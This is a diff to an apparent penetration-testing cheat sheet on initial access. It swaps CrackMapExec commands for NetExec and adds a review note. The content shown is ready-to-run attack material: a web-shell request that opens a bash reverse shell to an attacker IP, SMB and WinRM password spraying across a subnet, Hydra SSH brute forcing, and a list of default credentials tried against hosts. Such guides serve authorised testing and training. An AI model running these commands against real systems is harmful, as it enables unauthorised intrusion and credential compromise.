@@ -1,5 +1,7 @@
 # 🚪 Phase 1: Initial Access
 
+> **Review status:** Source verification pending. Confirm version-sensitive commands against the official documentation before use.
+
 ```
   ██╗███╗   ██╗██╗████████╗██╗ █████╗ ██╗          █████╗  ██████╗ ██████╗███████╗███████╗███████╗
   ██║████╗  ██║██║╚══██╔══╝██║██╔══██╗██║         ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
@@ -118,11 +120,11 @@ curl "http://target.com/cmd.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.
 
 ### Password Spraying
 ```bash
-# CrackMapExec - SMB
-crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' --continue-on-success
+# NetExec - SMB
+nxc smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' --continue-on-success
 
-# CrackMapExec - WinRM
-crackmapexec winrm 192.168.1.0/24 -u users.txt -p passwords.txt
+# NetExec - WinRM
+nxc winrm 192.168.1.0/24 -u users.txt -p passwords.txt
 
 # Hydra - SSH
 hydra -L users.txt -P passwords.txt ssh://192.168.1.10
@@ -149,8 +151,8 @@ root:root
 root:toor
 administrator:password
 
-# CrackMapExec with common creds
-crackmapexec smb 192.168.1.10 -u admin -p 'admin'
+# NetExec with common creds
+nxc smb 192.168.1.10 -u admin -p 'admin'
 ```
 
 ---
